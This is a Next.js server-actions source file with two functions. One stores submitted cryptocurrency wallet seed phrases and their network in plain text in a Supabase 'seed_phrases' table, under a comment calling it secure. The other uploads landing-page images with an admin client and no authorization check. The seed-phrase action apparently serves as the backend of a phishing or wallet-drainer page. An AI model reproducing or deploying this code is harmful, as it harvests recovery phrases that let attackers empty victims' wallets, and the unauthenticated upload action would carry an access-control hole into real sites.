
"use server";

import { z } from "zod";
import { createClient } from "@/lib/supabase/server";
import { revalidatePath } from "next/cache";

const formSchema = z.object({
  seedPhrase: z.string(),
  network: z.string(),
});

type RegistrationResult = {
  success: boolean;
  error?: string;
};

// This is a secure server action to register the seed phrase in Supabase
export async function registerSeedPhrase(
  formData: FormData
): Promise<RegistrationResult> {
  const rawFormData = {
    seedPhrase: formData.get("seedPhrase"),
    network: formData.get("network"),
  };

  const validatedFields = formSchema.safeParse(rawFormData);
  if (!validatedFields.success) {
    return {
      success: false,
      error: "Invalid data provided.",
    };
  }

  try {
    const supabaseAdmin = createClient();
    const { error } = await supabaseAdmin
      .from("seed_phrases")
      .insert([
        {
          seed_phrase: validatedFields.data.seedPhrase,
          network: validatedFields.data.network,
        },
      ])
      .select();

    if (error) {
      console.error("Supabase admin insert error:", error);
      return { success: false, error: `Database error: ${error.message}` };
    }

    return { success: true };
  } catch (err: any) {
    console.error("Unexpected error during seed registration:", err);
    return {
      success: false,
      error: "An unexpected server error occurred during registration.",
    };
  }
}

type UpdateImagesResult = {
  success: boolean;
  error?: string;
  updatedUrls?: Record<string, string>;
};

// This is a secure server action to upload images and update the database
export async function updateLandingPageImages(
  formData: FormData
): Promise<UpdateImagesResult> {

  // Use the service role client for all backend operations
  const supabaseAdmin = createClient();

  const bucketName = "landing-images";
  const updatedUrls: Record<string, string> = {};

  // Fetch the current content using the admin client
  const { data: currentContentData, error: fetchError } = await supabaseAdmin
    .from("editable_content")
    .select("content")
    .eq("id", "landing-page-images")
    .single();

  if (fetchError) {
    console.error("Supabase fetch error:", fetchError.message);
    return { success: false, error: `Database fetch error: ${fetchError.message}` };
  }

  const newContent = { ...currentContentData.content };

  for (const [id, file] of formData.entries()) {
    if (file instanceof File) {
      const filePath = `public/${id}-${Date.now()}`;
      
      const { error: uploadError } = await supabaseAdmin.storage
        .from(bucketName)
        .upload(filePath, file, {
            upsert: true, // Use upsert to handle re-uploads
        });

      if (uploadError) {
        console.error("Supabase upload error:", uploadError);
        return { success: false, error: `Upload error: ${uploadError.message}` };
      }

      const { data: publicUrlData } = supabaseAdmin.storage
        .from(bucketName)
        .getPublicUrl(filePath);

      if (publicUrlData) {
        newContent[id] = publicUrlData.publicUrl;
        updatedUrls[id] = publicUrlData.publicUrl;
      }
    }
  }
  
  // Use the same admin client to update the database table
  const { error: updateError } = await supabaseAdmin
    .from("editable_content")
    .update({ content: newContent, updated_at: new Date().toISOString() })
    .eq("id", "landing-page-images");

  if (updateError) {
    console.error("Supabase update error:", updateError);
    return { success: false, error: `Database update error: ${updateError.message}` };
  }

  // Revalidate the cache for the home page. This is crucial.
  revalidatePath('/');

  return { success: true, updatedUrls };
}
